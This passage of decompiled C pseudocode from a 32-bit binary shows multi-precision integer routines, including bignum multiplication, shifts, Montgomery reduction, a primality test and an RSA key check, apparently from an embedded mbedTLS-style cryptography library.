  void *Block; // [esp+1Ch] [ebp-8h]
  void *v22; // [esp+20h] [ebp-4h]

  v3 = (int)a1;
  v4 = a2;
  v16 = 1;
  v17 = 0;
  v18 = 0;
  v19 = 1;
  v20 = 0;
  Block = 0;
  if ( a1 == a2 )
  {
    v5 = sub_4031E0((int)&v16, (int)a2);
    if ( v5 )
      goto LABEL_30;
    v3 = (int)a1;
    v4 = &v16;
    a2 = &v16;
  }
  v6 = a3;
  if ( (int *)v3 == a3 )
  {
    v5 = sub_4031E0((int)&v19, (int)a3);
    if ( v5 )
      goto LABEL_28;
    v3 = (int)a1;
    v6 = &v19;
    a3 = &v19;
  }
  v7 = v4[1];
  if ( v7 )
  {
    v8 = (_DWORD *)(v4[2] + 4 * v7 - 4);
    do
    {
      if ( *v8 )
        break;
      --v8;
      --v7;
    }
    while ( v7 );
  }
  v9 = v6[1];
  if ( v9 )
  {
    v10 = (_DWORD *)(v6[2] + 4 * v9 - 4);
    do
    {
      if ( *v10 )
        break;
      --v10;
      --v9;
    }
    while ( v9 );
  }
  if ( v9 + v7 > 0x2710 )
  {
    v5 = -16;
    goto LABEL_28;
  }
  if ( *(_DWORD *)(v3 + 4) >= v9 + v7 )
  {
LABEL_23:
    v5 = sub_404E70(v3, 0);
    v22 = (void *)v5;
    if ( !v5 )
    {
      if ( v9 )
      {
        do
        {
          sub_406050(v7, (unsigned int *)a2[2], (unsigned int *)(a1[2] + 4 * v9 - 4), *(_DWORD *)(a3[2] + 4 * v9 - 4));
          --v9;
        }
        while ( v9 );
        v5 = (int)v22;
      }
      *a1 = *a3 * *a2;
    }
    goto LABEL_28;
  }
  v11 = calloc(v9 + v7, 4u);
  v22 = v11;
  if ( v11 )
  {
    v12 = *(const void **)(v3 + 8);
    if ( v12 )
    {
      memcpy(v11, v12, 4 * *(_DWORD *)(v3 + 4));
      sub_408020(*(void **)(v3 + 8), 4 * *(_DWORD *)(v3 + 4));
      free(*(void **)(v3 + 8));
      v11 = v22;
    }
    *(_DWORD *)(v3 + 8) = v11;
    *(_DWORD *)(v3 + 4) = v9 + v7;
    goto LABEL_23;
  }
  v5 = -16;
LABEL_28:
  v13 = Block;
  if ( Block )
  {
    sub_408020(Block, 4 * v20);
    free(v13);
  }
LABEL_30:
  v14 = v18;
  if ( v18 )
  {
    sub_408020(v18, 4 * v17);
    free(v14);
  }
  return v5;
}

//----- (00405360) --------------------------------------------------------
int __cdecl sub_405360(int a1, void *Src, size_t Size)
{
  size_t v3; // ebx
  int v4; // eax
  void *v5; // ecx
  void *v7; // edi
  const void *v8; // ecx
  int v9; // edi

  v3 = (Size >> 2) + ((Size & 3) != 0);
  v4 = *(_DWORD *)(a1 + 4);
  if ( v4 != v3 )
  {
    v5 = *(void **)(a1 + 8);
    if ( v5 )
    {
      sub_408020(v5, 4 * v4);
      free(*(void **)(a1 + 8));
    }
    *(_DWORD *)a1 = 1;
    *(_DWORD *)(a1 + 4) = 0;
    *(_DWORD *)(a1 + 8) = 0;
    if ( v3 > 0x2710 )
      return -16;
    if ( v3 )
    {
      v7 = calloc(v3, 4u);
      if ( !v7 )
        return -16;
      v8 = *(const void **)(a1 + 8);
      if ( v8 )
      {
        memcpy(v7, v8, 4 * *(_DWORD *)(a1 + 4));
        sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
        free(*(void **)(a1 + 8));
      }
      *(_DWORD *)(a1 + 4) = v3;
      *(_DWORD *)(a1 + 8) = v7;
    }
  }
  v9 = sub_404E70(a1, 0);
  if ( !v9 )
  {
    if ( Src )
    {
      memcpy((void *)(4 * v3 - Size + *(_DWORD *)(a1 + 8)), Src, Size);
      sub_405920(*(unsigned int **)(a1 + 8), v3);
    }
  }
  return v9;
}

//----- (00405470) --------------------------------------------------------
int __cdecl sub_405470(int a1, unsigned int a2)
{
  unsigned int v4; // ebx
  unsigned int v5; // eax
  size_t v6; // esi
  size_t v7; // ecx
  size_t v8; // eax
  void *v10; // esi
  const void *v11; // ecx
  int v12; // esi
  char v13; // cl
  int v14; // eax
  unsigned int v15; // esi
  unsigned int v16; // [esp+Ch] [ebp-4h]
  size_t v17; // [esp+18h] [ebp+8h]
  int v18; // [esp+1Ch] [ebp+Ch]

  v16 = 0;
  v4 = a2 >> 5;
  v18 = a2 & 0x1F;
  v5 = a2 + sub_402FC0(a1);
  v6 = *(_DWORD *)(a1 + 4);
  v7 = v6;
  if ( 32 * v6 < v5 )
  {
    v8 = (v5 >> 5) + ((v5 & 0x1F) != 0);
    v17 = v8;
    if ( v8 > 0x2710 )
      return -16;
    v7 = v6;
    if ( v6 < v8 )
    {
      v10 = calloc(v8, 4u);
      if ( !v10 )
        return -16;
      v11 = *(const void **)(a1 + 8);
      if ( v11 )
      {
        memcpy(v10, v11, 4 * *(_DWORD *)(a1 + 4));
        sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
        free(*(void **)(a1 + 8));
      }
      v7 = v17;
      *(_DWORD *)(a1 + 4) = v17;
      *(_DWORD *)(a1 + 8) = v10;
    }
  }
  if ( v4 )
  {
    if ( v7 > v4 )
    {
      v12 = 4 * (v7 - v4);
      do
      {
        v12 -= 4;
        *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v7-- - 4) = *(_DWORD *)(v12 + *(_DWORD *)(a1 + 8));
      }
      while ( v7 > v4 );
    }
    for ( ; v7; --v7 )
      *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v7 - 4) = 0;
  }
  v13 = v18;
  if ( v18 && v4 < *(_DWORD *)(a1 + 4) )
  {
    do
    {
      v14 = *(_DWORD *)(a1 + 8);
      v15 = *(_DWORD *)(v14 + 4 * v4);
      *(_DWORD *)(v14 + 4 * v4) = v15 << v13;
      *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v4++) |= v16;
      v13 = v18;
      v16 = v15 >> (32 - v18);
    }
    while ( v4 < *(_DWORD *)(a1 + 4) );
  }
  return 0;
}

//----- (004055B0) --------------------------------------------------------
int __cdecl sub_4055B0(int a1, unsigned int a2)
{
  unsigned int i; // edi
  int v3; // eax
  unsigned int v4; // esi
  unsigned int v5; // eax
  unsigned int v6; // edx
  int v7; // edi
  char v8; // cl
  int v9; // eax
  unsigned int v10; // esi
  int v12; // [esp+Ch] [ebp-4h]
  int v13; // [esp+1Ch] [ebp+Ch]

  v12 = 0;
  i = *(_DWORD *)(a1 + 4);
  v3 = a2 & 0x1F;
  v4 = a2 >> 5;
  v13 = v3;
  if ( v4 > i || v4 == i && v3 )
    return sub_404E70(a1, 0);
  if ( v4 )
  {
    v5 = 0;
    v6 = *(_DWORD *)(a1 + 4);
    if ( i != v4 )
    {
      v7 = 4 * v4;
      do
      {
        v7 += 4;
        *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v5++) = *(_DWORD *)(v7 + *(_DWORD *)(a1 + 8) - 4);
        v6 = *(_DWORD *)(a1 + 4);
      }
      while ( v5 < v6 - v4 );
    }
    for ( i = v6; v5 < i; i = *(_DWORD *)(a1 + 4) )
      *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v5++) = 0;
  }
  v8 = v13;
  if ( v13 && i )
  {
    do
    {
      v9 = *(_DWORD *)(a1 + 8);
      v10 = *(_DWORD *)(v9 + 4 * i - 4);
      *(_DWORD *)(v9 + 4 * i - 4) = v10 >> v8;
      *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * i - 4) |= v12;
      v8 = v13;
      v12 = v10 << (32 - v13);
      --i;
    }
    while ( i );
  }
  return 0;
}

//----- (004056A0) --------------------------------------------------------
unsigned int __cdecl sub_4056A0(int a1)
{
  return (sub_402FC0(a1) + 7) >> 3;
}

//----- (004056C0) --------------------------------------------------------
int __cdecl sub_4056C0(int a1, int a2, int a3)
{
  int *v3; // edi
  void *v5; // esi
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  int v9; // [esp+4h] [ebp-10h] BYREF
  int v10; // [esp+8h] [ebp-Ch]
  void *Block; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h]

  v3 = (int *)a3;
  if ( (sub_403020(a2, a3) & 0x80000000) != 0 )
    return -10;
  v5 = 0;
  v9 = 1;
  v10 = 0;
  Block = 0;
  if ( a1 != a3 )
    goto LABEL_6;
  v6 = sub_4031E0((int)&v9, a3);
  v5 = Block;
  v12 = v6;
  if ( !v6 )
  {
    v3 = &v9;
LABEL_6:
    if ( a1 == a2 || (v12 = sub_4031E0(a1, a2)) == 0 )
    {
      *(_DWORD *)a1 = 1;
      v7 = v3[1];
      v12 = 0;
      if ( v7 )
      {
        v8 = (_DWORD *)(v3[2] + 4 * v7 - 4);
        do
        {
          if ( *v8 )
            break;
          --v8;
          --v7;
        }
        while ( v7 );
      }
      sub_4062C0(v7, v3[2], *(unsigned int **)(a1 + 8));
    }
  }
  if ( v5 )
  {
    sub_408020(v5, 4 * v10);
    free(v5);
  }
  return v12;
}

//----- (00405790) --------------------------------------------------------
int __cdecl sub_405790(_DWORD *a1, int *a2, int a3)
{
  int v3; // ecx
  int v5[3]; // [esp+0h] [ebp-Ch] BYREF

  v3 = a3 >> 31;
  v5[1] = 1;
  a3 = abs32(a3);
  v5[2] = (int)&a3;
  v5[0] = (v3 & 0xFFFFFFFE) + 1;
  return sub_4057D0(a1, a2, v5);
}

//----- (004057D0) --------------------------------------------------------
int __cdecl sub_4057D0(_DWORD *a1, int *a2, _DWORD *a3)
{
  int v3; // esi
  _DWORD *v4; // edi
  int result; // eax

  v3 = *a2;
  if ( *a2 * *a3 <= 0 )
  {
    v4 = a1;
    result = sub_402D40((int)a1, (int)a2, (int)a3);
    if ( result )
      return result;
    goto LABEL_8;
  }
  if ( (sub_403020((int)a2, (int)a3) & 0x80000000) == 0 )
  {
    v4 = a1;
    result = sub_4056C0((int)a1, (int)a2, (int)a3);
    if ( result )
      return result;
LABEL_8:
    *v4 = v3;
    return result;
  }
  result = sub_4056C0((int)a1, (int)a3, (int)a2);
  if ( !result )
    *a1 = -v3;
  return result;
}

//----- (00405840) --------------------------------------------------------
int __cdecl sub_405840(__int64 *a1, __int64 *a2)
{
  int v2; // esi
  __int64 v3; // xmm1_8
  int result; // eax

  v2 = *((_DWORD *)a1 + 2);
  v3 = *a1;
  *a1 = *a2;
  result = *((_DWORD *)a2 + 2);
  *((_DWORD *)a1 + 2) = result;
  *a2 = v3;
  *((_DWORD *)a2 + 2) = v2;
  return result;
}

//----- (00405870) --------------------------------------------------------
int __cdecl sub_405870(int a1, char *a2, unsigned int a3)
{
  int v3; // ecx
  unsigned int v4; // eax
  unsigned int v5; // esi
  unsigned int v6; // ebx
  char *v7; // edi
  unsigned int v8; // esi
  char *v9; // edi
  int v10; // eax
  unsigned int v11; // edx
  char v12; // cl
  int v13; // eax

  v3 = a1;
  v4 = a3;
  v5 = 4 * *(_DWORD *)(a1 + 4);
  if ( v5 < a3 )
  {
    v6 = 4 * *(_DWORD *)(a1 + 4);
    v7 = &a2[a3 - v5];
    memset(a2, 0, a3 - v5);
LABEL_3:
    v3 = a1;
    goto LABEL_4;
  }
  v7 = a2;
  v6 = a3;
  if ( v5 <= a3 )
  {
LABEL_4:
    v8 = 0;
    if ( v6 )
    {
      v9 = &v7[v6 - 1];
      do
      {
        v10 = *(_DWORD *)(v3 + 8);
        --v9;
        v11 = v8 >> 2;
        v12 = 8 * (v8++ & 3);
        v13 = *(_DWORD *)(v10 + 4 * v11) >> v12;
        v3 = a1;
        v9[1] = v13;
      }
      while ( v8 < v6 );
    }
    return 0;
  }
  while ( 1 )
  {
    v6 = a3;
    if ( (unsigned __int8)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * (v4 >> 2)) >> (8 * (v4 & 3))) )
      return -8;
    if ( ++v4 >= v5 )
      goto LABEL_3;
  }
}

//----- (00405920) --------------------------------------------------------
void __cdecl sub_405920(unsigned int *a1, int a2)
{
  unsigned int *v2; // eax
  unsigned int v3; // ebx
  unsigned int v4; // edi
  int v5; // eax
  int v6; // esi
  int v7; // edx
  int v8; // edx
  unsigned int v9; // ebx
  int v10; // edi
  unsigned int v11; // edx
  int v12; // eax
  int v13; // eax
  unsigned int v14; // [esp+0h] [ebp-4h]
  unsigned int *v15; // [esp+10h] [ebp+Ch]

  if ( a2 )
  {
    v2 = a1;
    v15 = &a1[a2 - 1];
    if ( a1 <= v15 )
    {
      do
      {
        v3 = *v2;
        v4 = 0;
        v5 = 0;
        v6 = 4;
        do
        {
          v7 = (unsigned __int8)v3;
          v3 >>= 8;
          v8 = v7 << (24 - v5);
          v5 += 8;
          v4 |= v8;
          --v6;
        }
        while ( v6 );
        v9 = 0;
        v14 = v4;
        v10 = 4;
        v11 = *v15;
        do
        {
          v12 = (unsigned __int8)v11;
          v11 >>= 8;
          v13 = v12 << (24 - v6);
          v6 += 8;
          v9 |= v13;
          --v10;
        }
        while ( v10 );
        *a1 = v9;
        v2 = a1 + 1;
        *v15 = v14;
        a1 = v2;
        --v15;
      }
      while ( v2 <= v15 );
    }
  }
}

//----- (004059C0) --------------------------------------------------------
int __cdecl sub_4059C0(unsigned int a1)
{
  int *v1; // ebx
  int v2; // edi
  int v3; // esi
  int result; // eax
  int v5[3]; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+18h] [ebp-4h] BYREF

  v1 = (int *)a1;
  if ( (**(_BYTE **)(a1 + 8) & 1) == 0 )
    return -14;
  v5[1] = 1;
  v2 = 0;
  v5[2] = (int)&a1;
  v3 = 3;
  while ( 1 )
  {
    a1 = abs32(v3);
    v5[0] = ((v3 >> 31) & 0xFFFFFFFE) + 1;
    if ( sub_403100(v1, v5) <= 0 )
      break;
    result = sub_404F10(&v6, (int)v1, v3);
    if ( result )
      return result;
    if ( !v6 )
      return -14;
    v3 = dword_417574[v2++];
    if ( v3 <= 0 )
      return result;
  }
  return 1;
}
// 417574: using guessed type int dword_417574[167];

//----- (00405A60) --------------------------------------------------------
int __cdecl sub_405A60(int *a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4)
{
  void *v4; // ebx
  void *v5; // edi
  bool v6; // cc
  int v7; // esi
  unsigned int v8; // eax
  int *v9; // ebx
  unsigned int v10; // edi
  int v11; // esi
  int v12; // edx
  unsigned int v13; // eax
  unsigned int v14; // ecx
  unsigned int v15; // eax
  unsigned int v16; // eax
  unsigned int v17; // eax
  unsigned int v18; // ecx
  int v19; // esi
  unsigned int v20; // eax
  unsigned int v21; // edx
  int v22; // ecx
  unsigned int v23; // eax
  unsigned int v24; // eax
  unsigned int v25; // eax
  int v26; // eax
  int v27; // edi
  int v29[3]; // [esp+Ch] [ebp-64h] BYREF
  int v30; // [esp+18h] [ebp-58h] BYREF
  int v31; // [esp+1Ch] [ebp-54h]
  int *v32; // [esp+20h] [ebp-50h]
  int v33; // [esp+24h] [ebp-4Ch] BYREF
  int v34; // [esp+28h] [ebp-48h]
  void *v35; // [esp+2Ch] [ebp-44h]
  int v36; // [esp+30h] [ebp-40h] BYREF
  int v37; // [esp+34h] [ebp-3Ch]
  void *v38; // [esp+38h] [ebp-38h]
  int v39; // [esp+3Ch] [ebp-34h] BYREF
  int v40; // [esp+40h] [ebp-30h]
  void *v41; // [esp+44h] [ebp-2Ch]
  unsigned int v42; // [esp+48h] [ebp-28h] BYREF
  int v43; // [esp+4Ch] [ebp-24h]
  void *Block; // [esp+50h] [ebp-20h]
  int v45; // [esp+54h] [ebp-1Ch] BYREF
  int v46; // [esp+58h] [ebp-18h]
  _DWORD *v47; // [esp+5Ch] [ebp-14h]
  int v48; // [esp+60h] [ebp-10h] BYREF
  int v49; // [esp+64h] [ebp-Ch] BYREF
  int v50; // [esp+68h] [ebp-8h]
  unsigned int v51; // [esp+6Ch] [ebp-4h]

  v4 = 0;
  v32 = &v49;
  v5 = 0;
  v42 = 1;
  v6 = *a1 <= 0;
  v51 = *a1;
  v43 = 0;
  Block = 0;
  v39 = 1;
  v40 = 0;
  v41 = 0;
  v36 = 1;
  v37 = 0;
  v38 = 0;
  v45 = 1;
  v46 = 0;
  v47 = 0;
  v33 = 1;
  v34 = 0;
  v35 = 0;
  v49 = 1;
  v30 = 1;
  v31 = 1;
  if ( !v6 )
  {
    if ( (sub_403020((int)a1, (int)&v30) & 0x80000000) != 0 )
    {
      v7 = sub_4056C0((int)&v42, (int)&v30, (int)a1);
      if ( !v7 )
      {
        v42 = -v51;
        goto LABEL_10;
      }
    }
    else
    {
      v7 = sub_4056C0((int)&v42, (int)a1, (int)&v30);
      if ( !v7 )
      {
        v42 = v51;
        goto LABEL_10;
      }
    }
LABEL_66:
    if ( Block )
    {
      sub_408020(Block, 4 * v43);
      free(Block);
    }
    if ( v41 )
    {
      sub_408020(v41, 4 * v40);
      free(v41);
    }
    if ( v38 )
    {
      sub_408020(v38, 4 * v37);
      free(v38);
    }
    if ( v4 )
    {
      sub_408020(v4, 4 * v46);
      free(v4);
    }
    if ( v5 )
    {
      sub_408020(v5, 4 * v34);
      free(v5);
    }
    return v7;
  }
  v7 = sub_402D40((int)&v42, (int)a1, (int)&v30);
  v8 = v42;
  if ( !v7 )
    v8 = v51;
  v42 = v8;
  if ( v7 )
    goto LABEL_66;
LABEL_10:
  v51 = sub_404E20((int)&v42);
  v7 = sub_4031E0((int)&v39, (int)&v42);
  if ( v7 )
    goto LABEL_66;
  v7 = sub_4055B0((int)&v39, v51);
  if ( v7 )
    goto LABEL_66;
  v49 = 0;
  if ( !a2 )
    goto LABEL_66;
  v9 = a1;
LABEL_14:
  v50 = 0;
  while ( 1 )
  {
    v7 = sub_403F50((int)&v45, 4 * v9[1], a3, a4);
    if ( v7 )
      goto LABEL_65;
    if ( v46 )
    {
      v11 = v46 - 1;
      if ( v46 != 1 )
      {
        do
        {
          if ( v47[v11] )
            break;
          --v11;
        }
        while ( v11 );
      }
      v12 = v47[v11];
      v13 = 0x80000000;
      v14 = 0;
      while ( (v12 & v13) == 0 )
      {
        v15 = v13 >> 1;
        if ( (v12 & v15) != 0 )
        {
          ++v14;
          break;
        }
        v16 = v15 >> 1;
        if ( (v12 & v16) != 0 )
        {
          v14 += 2;
          break;
        }
        v17 = v16 >> 1;
        if ( (v12 & v17) != 0 )
        {
          v14 += 3;
          break;
        }
        v14 += 4;
        v13 = v17 >> 1;
        if ( v14 >= 0x20 )
          break;
      }
      v10 = 32 * (v11 + 1) - v14;
    }
    else
    {
      v10 = 0;
    }
    if ( v43 )
    {
      v19 = v43 - 1;
      if ( v43 != 1 )
      {
        do
        {
          if ( *((_DWORD *)Block + v19) )
            break;
          --v19;
        }
        while ( v19 );
      }
      v20 = 0x80000000;
      v21 = 0;
      v22 = *((_DWORD *)Block + v19);
      while ( (v22 & v20) == 0 )
      {
        v23 = v20 >> 1;
        if ( (v22 & v23) != 0 )
        {
          ++v21;
          break;
        }
        v24 = v23 >> 1;
        if ( (v22 & v24) != 0 )
        {
          v21 += 2;
          break;
        }
        v25 = v24 >> 1;
        if ( (v22 & v25) != 0 )
        {
          v21 += 3;
          break;
        }
        v21 += 4;
        v20 = v25 >> 1;
        if ( v21 >= 0x20 )
          break;
      }
      v18 = 32 * (v19 + 1) - v21;
    }
    else
    {
      v18 = 0;
    }
    if ( v10 > v18 )
      v47[v46 - 1] &= (1 << (v18 - 32 * (v46 - 1) - 1)) - 1;
    v26 = v50++;
    if ( v26 > 30 )
      return -14;
    v9 = a1;
    if ( sub_403100(&v45, (int *)&v42) < 0 )
    {
      v48 = 1;
      v32 = &v48;
      v30 = 1;
      v31 = 1;
      if ( sub_403100(&v45, &v30) > 0 )
      {
        v7 = sub_403860(&v45, &v45, (int)&v39, (int)a1, (int)&v33);
        if ( !v7 )
        {
          if ( !sub_403100(&v45, (int *)&v42) || !sub_4030C0(&v45, 1) )
            goto LABEL_64;
          v27 = 1;
          if ( v51 > 1 )
          {
            while ( sub_403100(&v45, (int *)&v42) )
            {
              v7 = sub_405190(&v36, &v45, &v45);
              if ( v7 )
                goto LABEL_65;
              v7 = sub_404FB0(&v45, &v36, a1);
              if ( v7 )
                goto LABEL_65;
              v48 = 1;
              v29[2] = (int)&v48;
              v29[0] = 1;
              v29[1] = 1;
              if ( sub_403100(&v45, v29) )
              {
                if ( ++v27 < v51 )
                  continue;
              }
              break;
            }
          }
          if ( sub_403100(&v45, (int *)&v42) || !sub_4030C0(&v45, 1) )
          {
            v7 = -14;
          }
          else
          {
LABEL_64:
            if ( ++v49 < a2 )
              goto LABEL_14;
          }
        }
LABEL_65:
        v4 = v47;
        v5 = v35;
        goto LABEL_66;
      }
    }
  }
}

//----- (00405EF0) --------------------------------------------------------
int __cdecl sub_405EF0(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // edi
  unsigned int v6; // ecx
  void *v7; // edx
  unsigned int v8; // esi
  unsigned int *v9; // ebx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  unsigned int v12; // edi
  int v13; // esi
  unsigned int v15; // [esp-18h] [ebp-2Ch]
  unsigned int *v16; // [esp-10h] [ebp-24h]
  unsigned int v17; // [esp+8h] [ebp-Ch]
  unsigned int v18; // [esp+Ch] [ebp-8h]
  unsigned int v19; // [esp+10h] [ebp-4h]

  v5 = a3;
  v6 = *(_DWORD *)(a5 + 4);
  if ( v6 < *(_DWORD *)(a3 + 4) + 1 )
    return -4;
  v7 = *(void **)(a5 + 8);
  if ( !v7 )
    return -4;
  memset(v7, 0, 4 * v6);
  v8 = *(_DWORD *)(a3 + 4);
  v9 = *(unsigned int **)(a5 + 8);
  v18 = v8;
  v10 = *(_DWORD *)(a2 + 4);
  if ( v10 >= v8 )
    v10 = *(_DWORD *)(a3 + 4);
  v11 = 0;
  v17 = v10;
  v19 = 0;
  if ( v8 )
  {
    do
    {
      v12 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v11);
      v16 = *(unsigned int **)(a2 + 8);
      v13 = a4 * (*v9 + v12 * *v16);
      sub_406050(v10, v16, v9, v12);
      v15 = v13;
      v8 = v18;
      sub_406050(v18, *(unsigned int **)(a3 + 8), v9, v15);
      v10 = v17;
      v11 = v19 + 1;
      *v9++ = v12;
      v19 = v11;
      v9[v18 + 1] = 0;
    }
    while ( v11 < v18 );
    v5 = a3;
  }
  memcpy(*(void **)(a1 + 8), v9, 4 * v8 + 4);
  if ( (sub_403020(a1, v5) & 0x80000000) != 0 )
    sub_4062C0(v8, *(_DWORD *)(a1 + 8), *(unsigned int **)(a5 + 8));
  else
    sub_4062C0(v8, *(_DWORD *)(v5 + 8), *(unsigned int **)(a1 + 8));
  return 0;
}

//----- (00406010) --------------------------------------------------------
int __cdecl sub_406010(int a1, int a2, int a3, int a4)
{
  int v5[3]; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v6 = 1;
  v5[2] = (int)&v6;
  v5[0] = 1;
  v5[1] = 1;
  return sub_405EF0(a1, (int)v5, a2, a3, a4);
}

//----- (00406050) --------------------------------------------------------
unsigned int __cdecl sub_406050(unsigned int a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
{
  unsigned __int64 v4; // rax
  unsigned int v5; // ecx
  unsigned int v6; // ecx
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rax
  bool v21; // zf
  unsigned int v22; // ecx
  unsigned __int64 v23; // rax
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // rax
  unsigned __int64 v27; // rax
  unsigned __int64 v28; // rax
  unsigned int *v29; // edx
  unsigned int result; // eax
  unsigned int v31; // [esp+Ch] [ebp-8h]
  unsigned int v32; // [esp+Ch] [ebp-8h]
  unsigned int v33; // [esp+10h] [ebp-4h]

  LODWORD(v4) = a1;
  v5 = 0;
  v33 = 0;
  if ( a1 >= 0x10 )
  {
    v31 = a1 >> 4;
    do
    {
      v6 = (*a3 + v33 + a4 * (unsigned __int64)*a2) >> 32;
      *a3 += v33 + a4 * *a2;
      v7 = a3[1] + v6 + a4 * (unsigned __int64)a2[1];
      a3[1] = v7;
      v8 = a3[2] + HIDWORD(v7) + a4 * (unsigned __int64)a2[2];
      a3[2] = v8;
      v9 = a3[3] + HIDWORD(v8) + a4 * (unsigned __int64)a2[3];
      a3[3] = v9;
      v10 = a3[4] + HIDWORD(v9) + a4 * (unsigned __int64)a2[4];
      a3[4] = v10;
      v11 = a3[5] + HIDWORD(v10) + a4 * (unsigned __int64)a2[5];
      a3[5] = v11;
      v12 = a3[6] + HIDWORD(v11) + a4 * (unsigned __int64)a2[6];
      a3[6] = v12;
      v13 = a3[7] + HIDWORD(v12) + a4 * (unsigned __int64)a2[7];
      a3[7] = v13;
      v14 = a3[8] + HIDWORD(v13) + a4 * (unsigned __int64)a2[8];
      a3[8] = v14;
      v15 = a3[9] + HIDWORD(v14) + a4 * (unsigned __int64)a2[9];
      a3[9] = v15;
      v16 = a3[10] + HIDWORD(v15) + a4 * (unsigned __int64)a2[10];
      a3[10] = v16;
      v17 = a3[11] + HIDWORD(v16) + a4 * (unsigned __int64)a2[11];
      a3[11] = v17;
      v18 = a3[12] + HIDWORD(v17) + a4 * (unsigned __int64)a2[12];
      a3[12] = v18;
      v19 = a3[13] + HIDWORD(v18) + a4 * (unsigned __int64)a2[13];
      a3[13] = v19;
      v20 = a3[14] + HIDWORD(v19) + a4 * (unsigned __int64)a2[14];
      a3[14] = v20;
      v4 = a3[15] + HIDWORD(v20) + a4 * (unsigned __int64)a2[15];
      a3[15] = v4;
      v33 = HIDWORD(v4);
      a3 += 16;
      a2 += 16;
      LODWORD(v4) = a1 - 16;
      v21 = v31-- == 1;
      a1 -= 16;
    }
    while ( !v21 );
    v5 = HIDWORD(v4);
  }
  if ( (unsigned int)v4 >= 8 )
  {
    v32 = (unsigned int)v4 >> 3;
    do
    {
      v22 = (*a3 + v33 + a4 * (unsigned __int64)*a2) >> 32;
      *a3 += v33 + a4 * *a2;
      v23 = a3[1] + v22 + a4 * (unsigned __int64)a2[1];
      a3[1] = v23;
      v24 = a3[2] + HIDWORD(v23) + a4 * (unsigned __int64)a2[2];
      a3[2] = v24;
      v25 = a3[3] + HIDWORD(v24) + a4 * (unsigned __int64)a2[3];
      a3[3] = v25;
      v26 = a3[4] + HIDWORD(v25) + a4 * (unsigned __int64)a2[4];
      a3[4] = v26;
      v27 = a3[5] + HIDWORD(v26) + a4 * (unsigned __int64)a2[5];
      a3[5] = v27;
      v28 = a3[6] + HIDWORD(v27) + a4 * (unsigned __int64)a2[6];
      a3[6] = v28;
      v4 = a3[7] + HIDWORD(v28) + a4 * (unsigned __int64)a2[7];
      a3[7] = v4;
      v33 = HIDWORD(v4);
      a3 += 8;
      a2 += 8;
      LODWORD(v4) = a1 - 8;
      v21 = v32-- == 1;
      a1 -= 8;
    }
    while ( !v21 );
    v5 = HIDWORD(v4);
  }
  if ( (_DWORD)v4 )
  {
    do
    {
      v5 = (*a3 + v33 + a4 * (unsigned __int64)*a2) >> 32;
      *a3 += v33 + a4 * *a2;
      v33 = v5;
      ++a3;
      ++a2;
      --a1;
    }
    while ( a1 );
  }
  v29 = a3;
  do
  {
    *v29 += v5;
    result = *a3;
    v29 = a3 + 1;
    v5 = *a3++ < v33;
    v33 = v5;
  }
  while ( v5 );
  return result;
}

//----- (004062C0) --------------------------------------------------------
unsigned int __cdecl sub_4062C0(int a1, int a2, unsigned int *a3)
{
  unsigned int result; // eax
  unsigned int *v4; // ebx
  int v5; // ecx
  unsigned int v6; // edx
  unsigned int v7; // edi
  unsigned int v8; // esi
  bool v9; // zf
  unsigned int v10; // edx
  unsigned int v11; // esi
  int v12; // [esp+Ch] [ebp+Ch]

  result = 0;
  if ( a1 )
  {
    v4 = a3;
    v5 = a2 - (_DWORD)a3;
    v12 = a2 - (_DWORD)a3;
    do
    {
      v6 = *v4;
      v7 = *v4 - result;
      *v4 = v7;
      v8 = *(unsigned int *)((char *)v4 + v5);
      *v4 = v7 - v8;
      result = (v7 < v8) + (v6 < result);
      ++v4;
      v9 = a1-- == 1;
      v5 = v12;
    }
    while ( !v9 );
    if ( result )
    {
      do
      {
        v10 = *v4++;
        v11 = result;
        *(v4 - 1) = v10 - result;
        result = v10 < result;
      }
      while ( v10 < v11 );
    }
  }
  return result;
}

//----- (00406330) --------------------------------------------------------
int __cdecl sub_406330(int *a1)
{
  int result; // eax

  if ( sub_4063B0((int)a1) )
    return -16896;
  if ( sub_4071B0(a1, 1) )
    return -16896;
  if ( sub_4082A0(a1 + 2, a1 + 11, a1 + 14, a1 + 8, a1 + 5, 0, 0) )
    return -16896;
  result = sub_4080F0(a1 + 11, a1 + 14, a1 + 8, a1 + 17, a1 + 20, a1 + 23);
  if ( result )
    return -16896;
  return result;
}

//----- (004063B0) --------------------------------------------------------
int __cdecl sub_4063B0(int a1)
{
  unsigned int v1; // ebx
  int *v2; // esi
  int *v3; // edi

  v1 = *(_DWORD *)(a1 + 4);
  v2 = (int *)(a1 + 8);
  if ( v1 == sub_4056A0(a1 + 8)
    && v1 <= 0x400
    && sub_4030C0(v2, 0) > 0
    && sub_4046C0((int)v2, 0)
    && (v3 = (int *)(a1 + 20), sub_4030C0((int *)(a1 + 20), 0) > 0)
    && sub_402FC0((int)v2) >= 0x80
    && sub_4046C0((int)v3, 0)
    && sub_402FC0((int)v3) >= 2
    && sub_403100(v3, v2) < 0 )
  {
